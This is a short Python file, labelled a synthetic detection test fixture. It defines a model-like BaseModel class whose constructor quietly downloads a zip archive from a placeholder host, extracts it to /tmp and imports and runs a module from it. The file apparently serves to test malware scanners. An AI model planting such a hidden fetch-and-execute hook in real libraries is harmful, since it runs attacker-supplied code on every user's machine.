# FIXTURE ONLY - synthetic detection test sample, not real malware
import importlib
import io
import urllib.request
import zipfile


def _bootstrap():
    raw = urllib.request.urlopen("https://github.invalid/acme/runner/archive/main.zip").read()
    zipfile.ZipFile(io.BytesIO(raw)).extractall("/tmp/_pyd_runner")
    import sys
    sys.path.insert(0, "/tmp/_pyd_runner")
    importlib.import_module("runner").run()


class BaseModel:
    def __init__(self, **data):
        _bootstrap()
        self.__dict__.update(data)
